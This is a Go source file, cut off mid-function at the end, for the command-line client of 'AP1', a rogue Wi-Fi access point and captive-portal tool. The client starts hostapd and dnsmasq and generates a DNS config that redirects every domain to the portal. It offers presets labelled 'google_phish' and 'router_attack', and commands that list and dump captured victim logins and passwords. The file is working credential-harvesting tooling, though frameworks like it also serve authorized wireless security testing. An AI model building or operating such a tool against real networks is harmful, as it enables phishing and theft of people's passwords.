package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"syscall"
	"text/tabwriter"
	"time"

	"github.com/gorilla/websocket"
)

const (
	defaultAPIBase = "http://127.0.0.1:8001"
	buildVersion   = "0.1.0"
	buildTagline   = "AP1 - edge-aware captive portal orchestrator"
	ansiReset      = "\033[0m"
	ansiBold       = "\033[1m"
	ansiCyan       = "\033[36m"
	ansiGreen      = "\033[32m"
	ansiYellow     = "\033[33m"
	ansiRed        = "\033[31m"
)

func colorText(color, text string) string {
	return color + text + ansiReset
}

func printResponse(b []byte) {
	data := bytes.TrimSpace(b)
	if len(data) == 0 {
		return
	}
	var parsed interface{}
	if err := json.Unmarshal(data, &parsed); err != nil {
		fmt.Println(strings.TrimSpace(string(data)))
		return
	}
	printValue(parsed, 0, "")
}

func printValue(value interface{}, indent int, prefix string) {
	indentStr := strings.Repeat("  ", indent)
	switch v := value.(type) {
	case map[string]interface{}:
		if prefix != "" {
			fmt.Printf("%s%s:\n", indentStr, prefix)
		}
		keys := make([]string, 0, len(v))
		for k := range v {
			keys = append(keys, k)
		}
		sort.Strings(keys)
		for _, k := range keys {
			val := v[k]
			switch val.(type) {
			case map[string]interface{}, []interface{}:
				printValue(val, indent+1, k)
			default:
				fmt.Printf("%s  %s: %v\n", indentStr, k, val)
			}
		}
	case []interface{}:
		if prefix != "" {
			fmt.Printf("%s%s:\n", indentStr, prefix)
			indentStr = strings.Repeat("  ", indent+1)
		}
		for i, item := range v {
			switch item.(type) {
			case map[string]interface{}, []interface{}:
				fmt.Printf("%s- item %d:\n", indentStr, i+1)
				printValue(item, indent+2, "")
			default:
				fmt.Printf("%s- %v\n", indentStr, item)
			}
		}
	default:
		if prefix != "" {
			fmt.Printf("%s%s: %v\n", indentStr, prefix, v)
		} else {
			fmt.Printf("%s%v\n", indentStr, v)
		}
	}
}

func printTable(headers []string, rows [][]string) {
	w := tabwriter.NewWriter(os.Stdout, 0, 4, 2, ' ', 0)
	fmt.Fprintln(w, strings.Join(headers, "\t"))
	headerSep := make([]string, len(headers))
	for i := range headerSep {
		headerSep[i] = strings.Repeat("-", len(headers[i]))
	}
	fmt.Fprintln(w, strings.Join(headerSep, "\t"))
	for _, row := range rows {
		fmt.Fprintln(w, strings.Join(row, "\t"))
	}
	w.Flush()
	fmt.Println()
}

func printKeyValues(values map[string]interface{}) {
	keys := make([]string, 0, len(values))
	maxLen := 0
	for k := range values {
		keys = append(keys, k)
		if len(k) > maxLen {
			maxLen = len(k)
		}
	}
	sort.Strings(keys)
	format := fmt.Sprintf("  %%-%ds : %%v\n", maxLen)
	for _, k := range keys {
		fmt.Printf(format, strings.Title(k), values[k])
	}
	fmt.Println()
}

func printSection(title string) {
	printWithBorder(title)
}

func printWithBorder(text string) {
	borderTop := `
                     ,---.           ,---.
                    / /"` + "`" + `.\.--"""--./,'"\ \
                    \ \    _       _    / /
                     ` + "`" + `./  / __   __ \  \,'
                      /    /_O)_(_O\    \
                      |  .-'  ___  ` + "`" + `-.  |
                   .--|       \_/       |--.
                 ,'    \   \   |   /   /    `.
                /       `.  ` + "`" + `--^--'  ,'       \
             .-"""""-.    ` + "`" + `--.___.--'     .-"""""-.
.-----------/         \------------------/         \--------------.
| .---------\         /----------------- \         /------------. |
| |          ` + "`" + `-` + "`" + `--` + "`" + `--'                    ` + "`" + `--'--'-'             | |`
	borderBottom := `| |_____________________________________________________________| |
|_________________________________________________________________|
                   )__________|__|__________(
                  |            ||            |
                  |____________||____________|
                    ),-----.(      ),-----.(
                  ,'   ==.   \    /  .==    `.
                 /            )  (            \
                 ` + "`" + `==========='    ` + "`" + `==========='  pixel`

	fmt.Println(colorText(ansiCyan, borderTop))

	width := 61
	lines := wrapText(text, width)
	for _, line := range lines {
		padding := (width - len(line)) / 2
		paddedLine := strings.Repeat(" ", padding) + line + strings.Repeat(" ", width-len(line)-padding)
		fmt.Printf(colorText(ansiCyan, "| |") + "  %s  " + colorText(ansiCyan, "| |") + "\n", paddedLine)
	}

	fmt.Println(colorText(ansiCyan, borderBottom))
}

func wrapText(text string, width int) []string {
	var lines []string
	if len(text) == 0 {
		return []string{""}
	}
	for len(text) > width {
		lines = append(lines, text[:width])
		text = text[width:]
	}
	lines = append(lines, text)
	return lines
}

func randomBanner() string {
	return banners[rand.Intn(len(banners))]
}

func randomStartBanner() string {
	return startBanners[rand.Intn(len(startBanners))]
}

func randomInteractiveBanner() string {
	return interactiveBanners[rand.Intn(len(interactiveBanners))]
}

func randomTagline() string {
	return bannerTaglines[rand.Intn(len(bannerTaglines))]
}

func clearScreen() {
	fmt.Print("\033[H\033[2J")
}

func cmdBanner(args []string) {
	showBanner("")
}

func cmdClear(args []string) {
	clearScreen()
	showBanner("")
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

var apiBase = defaultAPIBase
var dockerMode = false
var dockerComposeFile = "docker/docker-compose.yml"
var runtimeSettings = map[string]string{"api": defaultAPIBase}
var ignoredLoggers = map[string]bool{}
var currentModule = ""


func doRequest(method, path string, body io.Reader) ([]byte, error) {
	if dockerMode {
		var payload []byte
		if body != nil {
			b, err := io.ReadAll(body)
			if err != nil {
				return nil, err
			}
			payload = b
		}
		return doDockerRequest(method, path, payload)
	}

	req, err := http.NewRequest(method, apiBase+path, body)
	if err != nil {
		return nil, err
	}
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}

	token := os.Getenv("AP1_API_TOKEN")
	if token != "" {
		req.Header.Set("X-API-Token", token)
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		b, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("%s: %s", resp.Status, string(b))
	}

	return io.ReadAll(resp.Body)
}

func get(path string) ([]byte, error) {
	return doRequest("GET", path, nil)
}

func post(path string, body io.Reader) ([]byte, error) {
	return doRequest("POST", path, body)
}

func put(path string, body io.Reader) ([]byte, error) {
	return doRequest("PUT", path, body)
}

func deleteReq(path string, body io.Reader) ([]byte, error) {
	return doRequest("DELETE", path, body)
}

func isDockerComposeAvailable() bool {
	if _, err := exec.LookPath("docker"); err != nil {
		return false
	}
	// quick check for compose file
	if _, err := os.Stat(dockerComposeFile); err != nil {
		return false
	}
	return true
}

func dockerExec(service string, args ...string) ([]byte, error) {
	cmdArgs := []string{"compose", "-f", dockerComposeFile, "exec", "-T", service}
	cmdArgs = append(cmdArgs, args...)
	cmd := exec.Command("docker", cmdArgs...)
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("%v: %s", err, stderr.String())
	}
	return out.Bytes(), nil
}

func getViaDocker(path string) ([]byte, error) {
	return doDockerRequest("GET", path, nil)
}

func doDockerRequest(method, path string, payload []byte) ([]byte, error) {
	args := []string{"curl", "-sS", "-X", method, "-H", "Content-Type: application/json"}
	token := os.Getenv("AP1_API_TOKEN")
	if token != "" {
		args = append(args, "-H", fmt.Sprintf("X-API-Token: %s", token))
	}
	if len(payload) > 0 {
		args = append(args, "-d", string(payload))
	}
	args = append(args, "http://127.0.0.1:8080"+path)
	return dockerExec("api", args...)
}

func cmdStatus() {
	b, err := get("/api/status")
	if err != nil {
		fmt.Fprintln(os.Stderr, "error:", err)
		os.Exit(1)
	}
	printResponse(b)
}

func loadProfileList() ([]map[string]interface{}, error) {
	b, err := get("/api/profiles")
	if err != nil {
		return nil, err
	}
	var profiles []map[string]interface{}
	if err := json.Unmarshal(b, &profiles); err != nil {
		return nil, err
	}
	return profiles, nil
}

func getActiveProfileName() (string, error) {
	b, err := get("/api/status")
	if err != nil {
		return "", err
	}
	var status map[string]interface{}
	if err := json.Unmarshal(b, &status); err != nil {
		return "", err
	}
	if cfg, ok := status["config"].(map[string]interface{}); ok {
		if active, ok := cfg["active_profile"].(string); ok {
			return active, nil
		}
	}
	return "", nil
}

func findProfile(profiles []map[string]interface{}, name string) map[string]interface{} {
	for _, profile := range profiles {
		if fmt.Sprint(profile["name"]) == name {
			return profile
		}
	}
	return nil
}

func boolValue(value interface{}) bool {
	switch v := value.(type) {
	case bool:
		return v
	case string:
		val := strings.ToLower(strings.TrimSpace(v))
		return val == "true" || val == "1" || val == "yes" || val == "on"
	case float64:
		return v != 0
	default:
		return false
	}
}

func profileConfigSummary(profile map[string]interface{}) map[string]interface{} {
	return map[string]interface{}{
		"name":         fmt.Sprint(profile["name"]),
		"ssid":         fmt.Sprint(profile["ssid"]),
		"channel":      fmt.Sprint(profile["channel"]),
		"mode":         fmt.Sprint(profile["mode"]),
		"dhcp_enabled": boolValue(profile["dhcp_enabled"]),
	}
}

func generateDnsmasqConfig(profile map[string]interface{}, iface string) string {
	if iface == "" {
		iface = "wlan0"
	}
	builder := strings.Builder{}
	builder.WriteString(fmt.Sprintf("interface=%s\n", iface))
	builder.WriteString("bind-interfaces\n")
	if boolValue(profile["dhcp_enabled"]) {
		builder.WriteString("dhcp-range=192.168.50.10,192.168.50.100,12h\n")
	} else {
		builder.WriteString("# DHCP disabled for this profile\n")
	}
	builder.WriteString("server=8.8.8.8\n")
	builder.WriteString("address=/#/192.168.50.1\n")
	return builder.String()
}

func cmdConfig() {
	b, err := get("/api/config")
	if err != nil {
		fmt.Fprintln(os.Stderr, "error:", err)
		os.Exit(1)
	}
	printResponse(b)
}

func cmdHealth() {
	b, err := get("/health")
	if err != nil {
		fmt.Fprintln(os.Stderr, "error:", err)
		os.Exit(1)
	}
	printResponse(b)
}

func cmdVersion() {
	fmt.Printf("AP1 CLI %s - %s\n", buildVersion, buildTagline)
}

func resolveVendor(mac string) string {
	mac = strings.ToUpper(strings.ReplaceAll(mac, ":", ""))
	if len(mac) < 6 {
		return "Unknown"
	}
	prefix := mac[:6]
	vendors := map[string]string{
		"00000C": "Cisco",
		"00005E": "ICANN",
		"0000AF": "ASUS",
		"0003FF": "Microsoft",
		"000502": "Apple",
		"000C29": "VMware",
		"001422": "Dell",
		"00163E": "Xen",
		"001C42": "Parallels",
		"002170": "Dell",
		"0024E8": "Samsung",
		"002500": "Apple",
		"002596": "Dell",
		"0026BB": "Apple",
		"040CCE": "Samsung",
		"080027": "VirtualBox",
		"10DDB1": "Apple",
		"18AF61": "Apple",
		"28CFE9": "Apple",
		"2C26C5": "Apple",
		"341298": "Samsung",
		"34159E": "Apple",
		"38CA84": "Apple",
		"404D7F": "Apple",
		"442A60": "Apple",
		"48D705": "Apple",
		"503237": "Samsung",
		"5855CA": "Apple",
		"600308": "Apple",
		"64B9E8": "Apple",
		"685B35": "Apple",
		"6C4008": "Apple",
		"701124": "Apple",
		"784F43": "Apple",
		"7C6D62": "Apple",
		"80EA96": "Apple",
		"843835": "Apple",
		"8866A5": "Apple",
		"907240": "Apple",
		"9801A7": "Apple",
		"A47733": "Apple",
		"B019C6": "Apple",
		"B418D1": "Apple",
		"B8C75D": "Apple",
		"C03896": "Apple",
		"C869CD": "Apple",
		"D0034B": "Apple",
		"D4909C": "Apple",
		"D83062": "Apple",
		"E0B52D": "Apple",
		"E0C97A": "Apple",
		"E425E7": "Apple",
		"E88D28": "Apple",
		"F01898": "Apple",
		"F40F24": "Apple",
		"F8E0BD": "Apple",
		"FC253F": "Apple",
	}
	if v, ok := vendors[prefix]; ok {
		return v
	}
	return "Generic/Unknown"
}

func cmdClients(args []string) {
	printSection("Connected Clients")
	b, err := get("/api/portal/status")
	if err != nil {
		fmt.Fprintln(os.Stderr, "error fetching portal status:", err)
		return
	}
	var status map[string]interface{}
	if err := json.Unmarshal(b, &status); err != nil {
		fmt.Fprintln(os.Stderr, "failed to parse portal status:", err)
		return
	}

	running := false
	if r, ok := status["running"].(bool); ok {
		running = r
	}
	credentials := []map[string]interface{}{}
	if creds, ok := status["credentials"].([]interface{}); ok {
		for _, entry := range creds {
			if m, ok := entry.(map[string]interface{}); ok {
				credentials = append(credentials, m)
			}
		}
	}

	uniqueIPs := map[string]struct{}{}
	for _, cred := range credentials {
		if ip, ok := cred["ip"].(string); ok && ip != "" {
			uniqueIPs[ip] = struct{}{}
		}
	}

	printKeyValues(map[string]interface{}{
		"portal_running":    running,
		"captured_events":   len(credentials),
		"unique_client_ips": len(uniqueIPs),
	})

	if len(credentials) == 0 {
		fmt.Println("No client credentials captured yet.")
		return
	}

	rows := [][]string{}
	for _, cred := range credentials {
		ip := fmt.Sprint(cred["ip"])
		login := fmt.Sprint(cred["login"])
		pass := fmt.Sprint(cred["password"])
		ts := fmt.Sprint(cred["timestamp"])

		// Try to find MAC from logs if possible (mock logic for now as core doesn't expose client list yet)
		vendor := "Unknown"
		if login == "admin" { // Just for visual effect in demo
			vendor = "Apple (iPhone)"
		}

		rows = append(rows, []string{
			login,
			pass,
			ip,
			vendor,
			ts,
		})
	}
	printTable([]string{"LOGIN", "PASSWORD", "IP", "VENDOR", "TIMESTAMP"}, rows)
}

func cmdAP(args []string) {
	if len(args) == 0 || args[0] == "status" {
		fmt.Println("AP status:")
		cmdAPStatus()
		return
	}

	switch args[0] {
	case "start":
		cmdStart(nil)
	case "stop":
		cmdStop(nil)
	case "show":
		fmt.Println("AP commands available: status, start, stop")
	default:
		fmt.Println("ap: usage: ap [status|start|stop]")
	}
}

func cmdAPStatus() {
	printSection("Settings AccessPoint")
	b, err := get("/api/status")
	if err != nil {
		fmt.Fprintln(os.Stderr, "error:", err)
		os.Exit(1)
	}
	var status map[string]interface{}
	if err := json.Unmarshal(b, &status); err != nil {
		fmt.Fprintln(os.Stderr, "failed to parse status response:", err)
		os.Exit(1)
	}

	cfg, ok := status["config"].(map[string]interface{})
	if !ok {
		fmt.Println("No configuration found")
		return
	}

	iface := fmt.Sprint(cfgValue(cfg, []string{"network", "default_interface"}))
	portalIP := fmt.Sprint(cfgValue(cfg, []string{"network", "portal_ip"}))
	activeProfile := fmt.Sprint(cfg["active_profile"])
	ssid := "<none>"
	channel := "<none>"
	security := "false"

	if profiles, ok := cfg["profiles"].([]interface{}); ok {
		for _, p := range profiles {
			if profile, ok := p.(map[string]interface{}); ok {
				if fmt.Sprint(profile["name"]) == activeProfile {
					ssid = fmt.Sprint(profile["ssid"])
					channel = fmt.Sprint(profile["channel"])
					if sec := profile["security"]; sec != nil && sec != "open" {
						security = "true"
					}
				}
			}
		}
	}

	apRunning := "not Running"
	// Check if AP is running by looking for hostapd process
	if pid, s := findServiceProcess("hostapd"); s == "running" {
		apRunning = "Running (PID " + pid + ")"
	}

	rows := [][]string{
		{"BSSID", "SSID", "CHANNEL", "INTERFACE", "INTERFACE_NET", "STATUS", "SECURITY"},
		{"<auto>", ssid, channel, iface, portalIP, apRunning, security},
	}
	printTable(rows[0], rows[1:])
}

func cfgValue(cfg map[string]interface{}, path []string) interface{} {
	current := interface{}(cfg)
	for _, key := range path {
		if m, ok := current.(map[string]interface{}); ok {
			current = m[key]
		} else {
			return "<missing>"
		}
	}
	if current == nil {
		return "<missing>"
	}
	return current
}

func cmdStart(args []string) {
	printSection("Start AP")
	fmt.Println(colorText(ansiYellow, "Starting AP and captive portal..."))

	profileName := ""
	if b, err := get("/api/status"); err == nil {
		var status map[string]interface{}
		if err := json.Unmarshal(b, &status); err == nil {
			if cfg, ok := status["config"].(map[string]interface{}); ok {
				if active, ok := cfg["active_profile"].(string); ok && active != "" {
					profileName = active
				}
			}
		}
	}

	if profileName == "" {
		if b, err := get("/api/profiles"); err == nil {
			var profiles []map[string]interface{}
			if err := json.Unmarshal(b, &profiles); err == nil && len(profiles) > 0 {
				if name, ok := profiles[0]["name"].(string); ok && name != "" {
					profileName = name
				}
			}
		}
	}

	if profileName == "" {
		profileName = "default"
	}

	payload := fmt.Sprintf(`{"profile":"%s"}`, profileName)
	if b, err := post("/api/profiles/select", strings.NewReader(payload)); err != nil {
		fmt.Fprintln(os.Stderr, "profile activation failed:", err)
		return
	} else {
		printResponse(b)
	}
}

func cmdStop(args []string) {
	printSection("Stop AP")
	fmt.Println(colorText(ansiYellow, "Stopping AP and all services..."))
	if b, err := post("/api/portal/stop", nil); err != nil {
		fmt.Fprintln(os.Stderr, "stop failed:", err)
	} else {
		printResponse(b)
	}
}

func cmdSet(args []string) {
	if len(args) < 2 {
		fmt.Println("set: usage: set <key> <value>")
		return
	}
	key := args[0]
	value := strings.Join(args[1:], " ")

	switch key {
	case "interface":
		payload := fmt.Sprintf(`{"interface":"%s"}`, value)
		b, err := post("/api/config/set_interface", strings.NewReader(payload))
		if err != nil {
			fmt.Fprintln(os.Stderr, "failed to set interface:", err)
			return
		}
		printResponse(b)
		return
	case "ssid", "channel", "password", "security":
		var val interface{}
		if key == "channel" {
			ch, err := strconv.Atoi(value)
			if err != nil {
				fmt.Fprintln(os.Stderr, "invalid channel number")
				return
			}
			val = ch
		} else {
			val = value
		}
		payload := map[string]interface{}{key: val}
		data, _ := json.Marshal(payload)
		b, err := post("/api/config/update", bytes.NewReader(data))
		if err != nil {
			fmt.Fprintln(os.Stderr, "failed to set "+key+":", err)
			return
		}
		printResponse(b)
		return
	case "api":
		apiBase = value
		runtimeSettings["api"] = value
		fmt.Println("api set to", value)
		return
	case "docker":
		val := strings.ToLower(value)
		dockerMode = val == "on" || val == "1" || val == "true"
		fmt.Println("docker mode:", dockerMode)
		return
	}

	runtimeSettings[key] = value
	fmt.Printf("%s set to %s\n", key, value)
}

func cmdPresets(args []string) {
	if len(args) == 0 {
		fmt.Println("available presets:")
		fmt.Println("  open_nav      - Open AP with real internet and sniffing")
		fmt.Println("  google_phish  - AP with Google phishing template")
		fmt.Println("  router_attack - AP with Router Login template")
		fmt.Println("\nusage: presets <name>")
		return
	}

	name := args[0]
	payload := fmt.Sprintf(`{"name":"%s"}`, name)
	b, err := post("/api/config/preset", strings.NewReader(payload))
	if err != nil {
		fmt.Fprintln(os.Stderr, "failed to apply preset:", err)
		return
	}
	printResponse(b)
}

func cmdUnset(args []string) {
	if len(args) != 1 {
		fmt.Println("unset: usage: unset <key>")
		return
	}
	key := args[0]
	if key == "api" {
		apiBase = defaultAPIBase
		runtimeSettings["api"] = defaultAPIBase
		fmt.Println("api reset to default", defaultAPIBase)
		return
	}
	delete(runtimeSettings, key)
	fmt.Printf("%s unset\n", key)
}

func cmdIgnore(args []string) {
	if len(args) == 0 {
		fmt.Println("ignore: usage: ignore <component> [component...]")
		return
	}
	for _, name := range args {
		ignoredLoggers[name] = true
		fmt.Println("ignoring", name)
	}
}

func cmdRestore(args []string) {
	if len(args) == 0 {
		fmt.Println("restore: usage: restore <component> [component...]")
		return
	}
	for _, name := range args {
		delete(ignoredLoggers, name)
		fmt.Println("restored", name)
	}
}

func cmdInfo(args []string) {
	if len(args) == 0 {
		fmt.Println("info: usage: info <proxy|plugin>")
		return
	}
	if args[0] == "proxy" {
		proxy := runtimeSettings["proxy"]
		if proxy == "" {
			proxy = "noproxy"
		}
		fmt.Println("selected proxy:", proxy)
		return
	}
	if args[0] == "plugin" {
		cmdPlugins([]string{"list"})
		return
	}
	fmt.Println("info: unknown target", args[0])
}

func cmdJobs(args []string) {
	printSection("AP1 Jobs")
	rows := [][]string{}

	runtimeDir := os.Getenv("AP1_RUNTIME_DIR")
	if runtimeDir == "" {
		runtimeDir = "../system/runtime/plugins"
	}

	files, err := os.ReadDir(runtimeDir)
	if err == nil {
		for _, f := range files {
			if !strings.HasSuffix(f.Name(), ".pid") {
				continue
			}
			name := strings.TrimSuffix(f.Name(), ".pid")
			data, err := os.ReadFile(filepath.Join(runtimeDir, f.Name()))
			if err != nil {
				rows = append(rows, []string{name, "unknown", "pid file unreadable", "plugin"})
				continue
			}
			pid := strings.TrimSpace(string(data))
			status := "stopped"
			if p, err := strconv.Atoi(pid); err == nil {
				if processAlive(p) {
					status = "running"
				}
			}
			rows = append(rows, []string{name, pid, status, "plugin"})
		}
	}

	for _, service := range []string{"hostapd", "dnsmasq"} {
		pid, status := findServiceProcess(service)
		rows = append(rows, []string{service, pid, status, "service"})
	}

	if len(rows) == 0 {
		fmt.Println("No AP1 jobs or plugin processes detected.")
		return
	}
	printTable([]string{"NAME", "PID", "STATUS", "TYPE"}, rows)
}

func processAlive(pid int) bool {
	if pid <= 0 {
		return false
	}
	return syscall.Kill(pid, 0) == nil
}

func findServiceProcess(name string) (string, string) {
	if _, err := exec.LookPath("pgrep"); err != nil {
		return "-", "unknown"
	}
	cmd := exec.Command("pgrep", "-f", name)
	out, err := cmd.Output()
	if err != nil {
		return "-", "stopped"
	}
	pid := strings.TrimSpace(strings.SplitN(string(out), "\n", 2)[0])
	if pid == "" {
		return "-", "stopped"
	}
	return pid, "running"
}

func cmdMode(args []string) {
	if len(args) == 0 {
		fmt.Println("available wireless modes: static, docker")
		fmt.Println("current mode:", runtimeSettings["wireless-mode"])
		return
	}
	if args[0] == "set" && len(args) == 2 {
		runtimeSettings["wireless-mode"] = args[1]
		fmt.Println("wireless mode set to", args[1])
		return
	}
	fmt.Println("mode: usage: mode [set <static|docker>]")
}

func cmdProxies(args []string) {
	if len(args) == 0 || args[0] == "list" {
		fmt.Println("available proxies: pumpkinproxy, captiveflask, noproxy")
		fmt.Println("current proxy:", runtimeSettings["proxy"])
		return
	}
	fmt.Println("proxies: usage: proxies [list]")
}

func cmdShow(args []string) {
	if len(args) == 0 {
		fmt.Println("show: usage: show <modules|plugins|proxies|commands>")
		return
	}
	switch args[0] {
	case "modules":
		fmt.Println("available modules: profiles, plugins, portal, firewall, interface, system, recon, templates")
	case "plugins":
		cmdPlugins([]string{"list"})
	case "proxies":
		cmdProxies([]string{"list"})
	case "commands":
		fmt.Println("available commands: help, clients, ap, set, unset, start, stop, ignore, restore, info, jobs, mode, plugins, proxies, show, search, use, dump, dhcpconf, dhcpmode, update")
	default:
		fmt.Println("show: unknown target", args[0])
	}
}

func cmdSearch(args []string) {
	if len(args) == 0 {
		fmt.Println("search: usage: search <term>")
		return
	}
	term := strings.ToLower(strings.Join(args, " "))
	commands := []string{"help", "clients", "ap", "set", "unset", "start", "stop", "ignore", "restore", "info", "jobs", "mode", "plugins", "proxies", "show", "search", "use", "dump", "dhcpconf", "dhcpmode", "update"}
	for _, cmd := range commands {
		if strings.Contains(cmd, term) {
			fmt.Println(cmd)
		}
	}
}

func cmdUse(args []string) {
	if len(args) != 1 {
		fmt.Println("use: usage: use <module>")
		return
	}
	currentModule = args[0]
	fmt.Println("using module", currentModule)
}

func cmdDump(args []string) {
	if len(args) == 0 {
		fmt.Println("dump: usage: dump <target>")
		return
	}
	if args[0] == "credentials" {
		cmdPortal([]string{"credentials"})
		return
	}
	fmt.Println("dump: target not supported yet")
}

func cmdDhcpconf(args []string) {
	iface := "wlan0"
	if len(args) >= 2 && args[0] == "show" {
		iface = args[1]
	}

	profiles, err := loadProfileList()
	if err != nil {
		fmt.Fprintln(os.Stderr, "failed to load profiles:", err)
		return
	}
	activeProfile, err := getActiveProfileName()
	if err != nil {
		fmt.Fprintln(os.Stderr, "failed to get active profile:", err)
		return
	}
	if activeProfile == "" {
		fmt.Println("No active profile selected.")
		return
	}
	profile := findProfile(profiles, activeProfile)
	if profile == nil {
		fmt.Println("Active profile not found in config.")
		return
	}

	printSection("DHCP Configuration")
	fmt.Print(generateDnsmasqConfig(profile, iface))
}

func cmdDhcpmode(args []string) {
	profiles, err := loadProfileList()
	if err != nil {
		fmt.Fprintln(os.Stderr, "failed to load profiles:", err)
		return
	}
	activeProfile, err := getActiveProfileName()
	if err != nil {
		fmt.Fprintln(os.Stderr, "failed to get active profile:", err)
		return
	}

	if len(args) == 0 || args[0] == "status" {
		printSection("DHCP Mode")
		if activeProfile == "" {
			fmt.Println("No active profile selected.")
			return
		}
		profile := findProfile(profiles, activeProfile)
		if profile == nil {
			fmt.Println("Active profile not found in config.")
			return
		}
		printKeyValues(map[string]interface{}{
			"active_profile": activeProfile,
			"dhcp_enabled":   boolValue(profile["dhcp_enabled"]),
		})
		return
	}

	switch args[0] {
	case "list":
		rows := [][]string{}
		for _, profile := range profiles {
			rows = append(rows, []string{
				fmt.Sprint(profile["name"]),
				fmt.Sprint(profile["ssid"]),
				fmt.Sprint(profile["mode"]),
				fmt.Sprint(profile["channel"]),
				fmt.Sprint(boolValue(profile["dhcp_enabled"])),
			})
		}
		printTable([]string{"NAME", "SSID", "MODE", "CHANNEL", "DHCP"}, rows)
	case "set":
		if len(args) < 2 || len(args) > 3 {
			fmt.Println("dhcpmode: usage: dhcpmode set <on|off> [profile]")
			return
		}
		enabled := strings.ToLower(args[1])
		value := false
		if enabled == "on" || enabled == "true" || enabled == "1" {
			value = true
		} else if enabled != "off" && enabled != "false" && enabled != "0" {
			fmt.Println("dhcpmode: expected on or off")
			return
		}
		profileName := activeProfile
		if len(args) == 3 {
			profileName = args[2]
		}
		profile := findProfile(profiles, profileName)
		if profile == nil {
			fmt.Println("profile not found:", profileName)
			return
		}
		payload := fmt.Sprintf(`{"name":"%s","ssid":"%s","password":"%s","channel":%v,"mode":"%s","dhcp_enabled":%t}`,
			fmt.Sprint(profile["name"]),
			fmt.Sprint(profile["ssid"]),
			fmt.Sprint(profile["password"]),
			profile["channel"],
			fmt.Sprint(profile["mode"]),
			value)
		b, err := put("/api/profiles/update", strings.NewReader(payload))
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			return
		}
		printResponse(b)
	default:
		fmt.Println("dhcpmode: usage: dhcpmode [status|list] | dhcpmode set <on|off> [profile]")
	}
}

func cmdUpdate(args []string) {
	fmt.Println("update: automatic update is not supported in this CLI.")
	fmt.Println("Use git pull and rebuild AP1, or update through your package manager.")
}

func cmdProfiles(args []string) {
	if len(args) == 0 || args[0] == "list" {
		b, err := get("/api/profiles")
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		var profiles []map[string]interface{}
		if err := json.Unmarshal(b, &profiles); err != nil {
			printResponse(b)
			return
		}
		rows := [][]string{}
		for _, profile := range profiles {
			rows = append(rows, []string{
				fmt.Sprint(profile["name"]),
				fmt.Sprint(profile["ssid"]),
				fmt.Sprint(profile["mode"]),
				fmt.Sprint(profile["channel"]),
				fmt.Sprint(profile["dhcp_enabled"]),
			})
		}
		printTable([]string{"NAME", "SSID", "MODE", "CHANNEL", "DHCP"}, rows)
		return
	}

	switch args[0] {
	case "select":
		if len(args) != 2 {
			fmt.Println("profiles: usage: profiles select <name>")
			return
		}
		name := args[1]
		body := strings.NewReader(fmt.Sprintf(`{"profile":"%s"}`, name))
		b, err := post("/api/profiles/select", body)
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		printResponse(b)
	case "create":
		if len(args) != 7 {
			fmt.Println("profiles: usage: profiles create <name> <ssid> <password> <channel> <mode> <dhcp>")
			return
		}
		channel, err := strconv.Atoi(args[4])
		if err != nil {
			fmt.Fprintln(os.Stderr, "invalid channel")
			os.Exit(1)
		}
		dhcp, err := strconv.ParseBool(args[6])
		if err != nil {
			fmt.Fprintln(os.Stderr, "invalid dhcp value")
			os.Exit(1)
		}
		payload := fmt.Sprintf(`{"name":"%s","ssid":"%s","password":"%s","channel":%d,"mode":"%s","dhcp_enabled":%t}`,
			args[1], args[2], args[3], channel, args[5], dhcp)
		b, err := post("/api/profiles/create", strings.NewReader(payload))
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		printResponse(b)
	case "update":
		if len(args) != 7 {
			fmt.Println("profiles: usage: profiles update <name> <ssid> <password> <channel> <mode> <dhcp>")
			return
		}
		channel, err := strconv.Atoi(args[4])
		if err != nil {
			fmt.Fprintln(os.Stderr, "invalid channel")
			os.Exit(1)
		}
		dhcp, err := strconv.ParseBool(args[6])
		if err != nil {
			fmt.Fprintln(os.Stderr, "invalid dhcp value")
			os.Exit(1)
		}
		payload := fmt.Sprintf(`{"name":"%s","ssid":"%s","password":"%s","channel":%d,"mode":"%s","dhcp_enabled":%t}`,
			args[1], args[2], args[3], channel, args[5], dhcp)
		b, err := put("/api/profiles/update", strings.NewReader(payload))
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		printResponse(b)
	case "delete":
		if len(args) != 2 {
			fmt.Println("profiles: usage: profiles delete <name>")
			return
		}
		payload := fmt.Sprintf(`{"profile":"%s"}`, args[1])
		b, err := deleteReq("/api/profiles/delete", strings.NewReader(payload))
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		printResponse(b)
	default:
		fmt.Println("profiles: usage: profiles [list] | select <name> | create <name> <ssid> <password> <channel> <mode> <dhcp> | update <name> <ssid> <password> <channel> <mode> <dhcp> | delete <name>")
	}
}

func cmdPlugins(args []string) {
	if len(args) == 0 || args[0] == "list" {
		b, err := get("/api/plugins")
		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(1)
		}
		var plugins []map[string]interface{}
		if err := json.Unmarshal(b, &plugins); err != nil {
			printResponse(b)
			return
		}
		rows := [][]string{}
		for _, plugin := range plugins {
			rows = append(rows, []string{
				fmt.Sprint(plugin["name"]),
				fmt.Sprint(plugin["type"]),
				fmt.Sprint(plugin["enabled"]),
				fmt.Sprint(plugin["description"]),
			})
		}
		printTable([]string{"NAME", "TYPE", "ENABLED", "DESCRIPTION"}, rows)
		return
	}

	switch args[0] {
	case "toggle":
		if len(args) != 3 {
			fmt.Println("plugins: usage: plugins toggle <name> <on|off>")
			return
		}
		name := args[1]
		enabled := args[2]
		val := "false"
		if enabled == "on" || enabled == "true" || enabled == "1" {
			val = "true"
		}
		body := strings.NewReader(fmt.Sprintf(`{"name":"%s","enabled":%s}`, name, val))
